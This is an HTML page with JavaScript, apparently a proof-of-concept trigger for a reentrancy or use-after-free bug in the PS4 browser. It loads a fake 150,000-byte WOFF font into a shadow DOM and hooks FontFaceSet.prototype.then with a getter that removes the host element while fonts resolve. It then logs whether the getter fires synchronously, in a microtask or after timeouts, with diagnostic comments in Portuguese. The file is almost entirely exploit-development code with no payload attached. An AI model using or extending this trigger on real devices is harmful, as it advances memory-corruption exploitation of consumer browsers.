
<!DOCTYPE html>
<html>
<body>
<script>
// 03_ps4_v2: duas correcoes adicionais
//   - font/woff em vez de font/otf (confirmado no diagnostico_86074ba que ficou loading)
//   - checkpoint async para ver se getter dispara apos o script

document.fonts;

function log(message) {
    document.body.appendChild(document.createTextNode(message));
    document.body.appendChild(document.createElement("br"));
}

(function run() {
    const host = document.createElement("div");
    document.body.appendChild(host);
    const shadowRoot = host.attachShadow({ mode: "open" });

    // WOFF em vez de OTF: diagnostico provou que font/woff vai para "loading" no PS4
    const dataUrl = "data:font/woff;base64," + "A".repeat(150000);

    const fontFaceStyle = document.createElement("style");
    fontFaceStyle.textContent =
        `@font-face { font-family: reentryFont; src: url("${dataUrl}"); }` +
        `.probe { font: 24px reentryFont; }`;
    shadowRoot.appendChild(fontFaceStyle);

    const probe = document.createElement("span");
    probe.className = "probe";
    probe.textContent = "A";
    shadowRoot.appendChild(probe);

    document.body.offsetHeight;
    // Checar status ANTES e DEPOIS de fonts.load() para diagnóstico
    log("status apos offsetHeight: " + document.fonts.status);
    document.fonts.load("24px reentryFont", "A");
    log("status apos fonts.load: " + document.fonts.status);

    document.fonts.ready;

    let getterCallCount = 0;
    Object.defineProperty(FontFaceSet.prototype, "then", {
        configurable: true,
        get() {
            delete FontFaceSet.prototype.then;
            ++getterCallCount;
            log(">>> GETTER DISPAROU! count=" + getterCallCount);
            host.remove();
            log("apos host.remove()");
            return undefined;
        }
    });

    const prependedStyle = document.createElement("style");
    prependedStyle.textContent = ".unused { color: red; }";
    shadowRoot.prepend(prependedStyle);

    document.styleSheets.length;

    log("getter sync: " + getterCallCount);
    log("status: " + document.fonts.status);

    // Checkpoint async: continua monitorando apos o script
    Promise.resolve().then(() => {
        log("microtask: getter=" + getterCallCount
            + " status=" + document.fonts.status);
    });

    // Checkpoint tardio: verifica se getter disparou como macrotask
    setTimeout(() => {
        log("setTimeout(0): getter=" + getterCallCount
            + " status=" + document.fonts.status);
    }, 0);

    setTimeout(() => {
        log("setTimeout(500): getter=" + getterCallCount
            + " status=" + document.fonts.status);
    }, 500);
})();
</script>
</body>
</html>
